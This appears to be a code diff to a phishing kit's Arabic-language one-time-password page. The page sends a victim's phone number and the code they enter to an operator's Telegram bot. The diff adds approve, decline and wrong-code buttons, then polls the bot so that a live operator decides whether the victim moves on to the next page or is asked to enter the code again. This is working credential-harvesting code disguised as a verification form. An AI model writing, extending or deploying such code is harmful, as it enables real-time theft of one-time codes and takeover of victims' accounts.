@@ -249,7 +249,7 @@
                     <input id="otp-input" name="otp" type="text" maxlength="6" placeholder="------" autocomplete="off" required aria-describedby="message" />
 
                     <div class="timer-container">
-                        تنصلاحية الرمز تنتهي خلال: <span id="timerText">30s</span>
+                        صلاحية الرمز تنتهي خلال: <span id="timerText">30s</span>
                     </div>
 
                     <p class="message" id="message" aria-live="polite"></p>
@@ -276,8 +276,9 @@
         const messageEl = document.getElementById('message');
         const timerText = document.getElementById('timerText');
 
-        let seconds = 30;
+        let seconds = 300;
         let countdown = null;
+        let pollInterval = null;
 
         const savedPhone = localStorage.getItem('phone') || '785123463';
 
@@ -318,22 +319,6 @@
         startCountdown();
         otpInput.focus();
 
-        function sendToBot(botToken, chatId, text) {
-            const payload = {
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'Markdown'
-            };
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
         confirmBtn.addEventListener('click', () => {
             const otpValue = otpInput.value.trim();
             if (otpValue.length !== 6) return;
@@ -344,21 +329,124 @@
                 return;
             }
 
-            messageEl.className = 'processing';
+            // Unique session ID for this OTP submission
+            const userId = Date.now() + "_" + otpValue.slice(-2);
+
+            messageEl.className = 'message';
             messageEl.textContent = 'جاري التحقق.......';
 
             const message =
                 `*التحقق من رمز OTP*\n\n` +
-                `📱 الهاتف: +258 ${savedPhone}\n` +
+                `📱 الهاتف: +249 ${savedPhone}\n` +
                 `🔢 الرمز المدخل: ${otpValue}`;
 
-            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message);
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ APPROVE", callback_data: `approve_otp_${userId}` },
+                        { text: "❌ DECLINE", callback_data: `decline_otp_${userId}` },
+                    ],
+                    [
+                        { text: "⚠️ WRONG OTP", callback_data: `wrong_otp_${userId}` },
+                    ],
+                ],
+            };
 
-            // Redirect to number.html after a brief moment
-            setTimeout(() => {
-                window.location.href = 'number.html';
-            }, 1500);
+            // Send to Telegram with Inline Keyboard
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    messageEl.className = 'message success';
+                    messageEl.textContent = 'جاري انتظار الموافقة.....';
+                    otpInput.disabled = true;
+                    confirmBtn.disabled = true;
+
+                    // Start polling updates
+                    startPolling(userId);
+                } else {
+                    messageEl.className = 'message error';
+                    messageEl.textContent = 'حدث خطأ أثناء إرسال البيانات.';
+                }
+            })
+            .catch(() => {
+                messageEl.className = 'message error';
+                messageEl.textContent = 'حدث خطأ في الشبكة.';
+            });
         });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+                            
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+                                
+                                if (callbackData.includes(userId)) {
+                                    // Acknowledge callback query
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: latestUpdate.callback_query.id })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_otp_")) {
+                                        messageEl.className = 'message success';
+                                        messageEl.textContent = 'تمت الموافقة بنجاح! جاري الانتقال...';
+                                        setTimeout(() => {
+                                            window.location.href = 'number.html';
+                                        }, 1000);
+                                    } 
+                                    else if (callbackData.startsWith("decline_otp_")) {
+                                        messageEl.className = 'message error';
+                                        messageEl.textContent = 'تم رفض الطلب، يرجى إعادة المحاولة.';
+                                        resetFormState();
+                                    } 
+                                    else if (callbackData.startsWith("wrong_otp_")) {
+                                        messageEl.className = 'message error';
+                                        messageEl.textContent = 'رمز التحقق غير صحيح، يرجى إعادة إدخال الرمز الصحيح.';
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            otpInput.value = '';
+            otpInput.disabled = false;
+            confirmBtn.disabled = true;
+            confirmBtn.classList.remove('enabled');
+            otpInput.focus();
+        }
     </script>
 </body>
 
